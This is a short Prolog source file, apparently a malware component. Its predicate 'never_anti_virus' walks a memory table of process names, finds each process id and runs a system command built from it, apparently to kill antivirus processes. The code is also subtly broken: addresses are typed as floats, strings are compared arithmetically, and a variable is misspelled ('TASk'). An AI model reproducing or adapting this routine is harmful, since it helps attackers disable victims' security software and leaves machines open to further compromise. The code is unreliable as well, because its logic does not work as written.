:-foreign(findprocessid_wrapper(+string,-integer)).
:-foreign(string_ptr_dereference(+float,-string)).
:-foreign(sprintf_wrapper(+integer,-string)).
:-foreign(system_wrapper(+string)).
:-foreign(char_ptr_dereference(+float,-char)).

never_anti_virus(TASKKILL):- C is 0, loop(C,TASKKILL).

loop(C,TASKKILL) :- MEM_ADDRESS is TASKKILL+(C*4), string_ptr_dereference(MEM_ADDRESS,TASK),
  TASK =\= 0, findprocessid_wrapper(TASK,PID), ((PID =\=0,sprintf_wrapper(PID,COMMAND), 
  system_wrapper(COMMAND));(nl)), C1 is C+1, loop(C1,TASKKILL).
loop(C,TASKKILL) :- MEM_ADDRESS is TASKKILL+C*4, string_ptr_dereference(MEM_ADDRESS,TASK),\+(TASk=\=0).
